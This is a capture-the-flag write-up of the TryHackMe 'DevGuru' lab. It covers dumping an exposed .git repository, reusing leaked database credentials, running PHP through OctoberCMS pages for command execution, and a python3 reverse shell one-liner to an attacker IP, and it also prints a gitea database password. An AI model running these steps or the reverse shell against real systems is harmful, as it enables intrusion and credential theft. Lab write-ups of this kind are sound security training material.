# TryHackMe-DevGuru

## NMAP

```
Nmap scan report for 10.10.172.205                                                                                                          [83/877]
Host is up (0.16s latency).                                                                                                                         
Not shown: 65532 closed ports                                                                                                                       
PORT     STATE SERVICE VERSION                                                                                                                      
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:                                                            
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)                                                                                      
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: DevGuru                                                 
| http-git: 
|   10.10.172.205:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corp - DevGuru
8585/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK                                                                                                                       [54/877]
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=f886af904a2de78a; Path=/; HttpOnly
|     Set-Cookie: _csrf=5bPJDT7tyJUhTZEjhejaOuL5wHU6MTYwNzE2ODk5ODQ5MDExOTg3MQ; Path=/; Expires=Sun, 06 Dec 2020 11:49:58 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 05 Dec 2020 11:49:58 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1"> 
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=f1edb5b66713a6a2; Path=/; HttpOnly
|     Set-Cookie: _csrf=5rcSOwMuyIXJxXduyRO14YPZQT06MTYwNzE2ODk5ODgzMzcyMzg5Mg; Path=/; Expires=Sun, 06 Dec 2020 11:49:58 GMT; HttpOnly
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1"> 
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
submit.cgi?new-service :
```

## PORT 80

<img src="https://imgur.com/wkw4oBK.png"/>

We don't see anything interesting on the web page. Looking at the nmap results there's a `git` directory we find so let's visit that directory

<img src="https://imgur.com/mxuXtfl.png"/>

On visting find a page which tells us a reference to `master branch`

<img src="https://imgur.com/6ad0R7b.png"/>

So it seems that there is a github repository on the box , so let's try to dump the files. We can use a tool for that which is called `GitTools`

`https://github.com/internetwache/GitTools`

<img src="https://imgur.com/iAx6MrX.png"/>

After running the tool it took 22 minutes for me dump the `./git` directory

<img src="https://imgur.com/9zqh623.png"/>

<img src="https://imgur.com/OqxPrI9.png"/>

Now we cannot extract some useful data like this for that we have to use `Extractor` from GitTools

First move that dumped `./git` folder to a another folder then run the tool 

<img src="https://imgur.com/VxHorRk.png"/>

<img src="https://imgur.com/PLUyTT9.png"/>

As you can see it finds a bunch of files which makes our work way easier

Reading through the contents of `.htaccess` we find that there is a login page for database

<img src="https://imgur.com/OkZn47d.png"/>

<img src="https://imgur.com/Bl8k0Fl.png"/>

Going back to that extracted folder of `./git` we can find `config/database.php` which has credentials for mysql database

<img src="https://imgur.com/zgme3uj.png"/>

<img src="https://imgur.com/7rYHcwb.png"/>

And we can login ourself in , Great !

Now `Octobercms` has blocked extensions of `php` files , you could try changing the extensions to .php3,.php4,.php5,.phtml but it  won't work , what we can do is run php code on html pages 

`https://octobercms.com/forum/post/running-php-code-on-pages`

Here it tells how we can do that 

<img src="https://imgur.com/cH9gjcI.png"/>

<img src="https://imgur.com/1xJcMms.png"/>

<img src="https://imgur.com/s7NZiU3.png"/>

As we can see it does run php code so now we have to craft a php reverse shell to get onto the box,Let's test this for a simple `$_GET["command"]`

<img src="https://imgur.com/EoScBCY.png"/>

<img src="https://imgur.com/PKO3li5.png"/>

<img src="https://imgur.com/MpGFi2u.png"/>

And we can run system commands so only thing left to do is to setup a netcat listener and run a reverse shell command in that parameter.So I am going to use a python3 reverse shell because python3 is installed on the box

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.54.209",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<img src="https://imgur.com/qMkp8m8.png"/>

And we got a shell finally , sweet !!

Now we must enumerate the box , to do that transfer `linpeas` on the target box by python http server

<img src="https://imgur.com/ZSWBN92.png"/>

During the enumaration process we find some intersting backup files

<img src="https://imgur.com/kAw2XSu.png"/>

<img src="https://imgur.com/wbViaQ1.png"/>

Here we can see that there is another database for `gitea` which is running on port 8585,also we look at the bottom we'll find that we can use three hashing algorithms `bcrypt`,`pbkdf2` and `scrypt`

<img src="https://imgur.com/M6BTijb.png"/>

So let's login to the database like we did with `octoberdb`

<img src="https://imgur.com/TsNzClM.png"/>

Here I cloned the `frank` user but added a `bcrpyt` password for him because with `pbkdf2` it was not allowing me to login


```
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306                                      
NAME                = gitea
USER                = gitea                                                                                                                         
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m    
```


 
--------

Here we can find the password for `frank` but it's saved as bcrypt because of `$2$` at the beginning.It would be useless to try cracking the hash we can just add a user with the password encrypted with `bcrypt`

<img src="https://imgur.com/934ryCW.png"/>

Then if we try to login we can access the dashboard of `OctoberCMS`

<img src="https://imgur.com/fu0N4RP.png"/>

By going to `Settings` then `Event log` we can see there's an image